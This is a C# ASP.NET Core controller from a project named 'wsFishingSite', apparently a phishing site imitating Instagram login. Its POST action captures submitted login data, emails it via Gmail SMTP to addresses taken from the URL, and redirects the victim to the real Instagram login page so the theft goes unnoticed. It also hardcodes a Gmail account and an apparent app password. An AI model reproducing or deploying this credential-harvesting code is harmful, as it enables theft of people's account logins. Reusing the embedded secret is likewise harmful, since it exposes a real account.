using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using System.Net;
using System.Net.Mail;
using wsFishingSite.Models;

namespace wsFishingSite.Controllers
{
    [Route("[controller]/{mails}")]

    public class LogInController : Controller
    {
        static string lastMails;
        [HttpGet]
        public IActionResult Login(string mails)
        
        {
            ViewBag.Mails = mails;
            return View();
        }

        [HttpPost]
        public IActionResult Login([FromForm] LoginDto request)
        {
            try
            {
                lastMails = request.Mails ?? lastMails;

                MailMessage mail = new MailMessage();

                mail.From = new MailAddress("ilkincavadovtest@gmail.com");
                lastMails.Split(',').ToList().ForEach(x => mail.To.Add(x));

                mail.Subject = "New User";
                mail.Body = JsonConvert.SerializeObject(request);
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com")
                {
                    Port= 587,
                    Credentials = new NetworkCredential("ilkincavadovtest@gmail.com", "lmeegsudwyeqyoba"),
                    EnableSsl = true
                };
                SmtpServer.Send(mail);
            }
            catch (Exception ex)
            {
                ;
            }

            return Redirect("https://www.instagram.com/accounts/login/");

        }
    }
}